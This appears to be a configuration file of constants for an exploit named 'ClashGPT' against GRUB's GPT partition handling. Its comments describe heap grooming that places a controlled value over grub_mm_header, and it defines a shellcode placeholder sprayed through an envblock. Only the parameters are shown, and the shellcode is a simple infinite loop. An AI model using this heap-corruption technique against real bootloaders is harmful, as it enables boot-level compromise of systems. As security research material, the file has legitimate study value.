BANNER = 'ClashGPT - bah / January 2025'

HASHSZ = 13
HASHVAL_SPRAY = 1
GPT_PARTITION_TYPE = 0xee

PROBE_DEPTH = 150
MAX_DEPTH = 256

BLOCK_SIZE = 512

NUDGE = 0

# the construction we are targetting is two 32kb allocations next to each other
# need to nudge this slightly to get our controlled value over the
# grub_mm_header
TRASH_ALLOC = ((32 * 1024) + NUDGE) * 'Z'

# this gets sprayed via an envblock.
# supports all characters except 0x00 and 0x0a.
SHELLCODE = b'\xeb\xfe' * 16
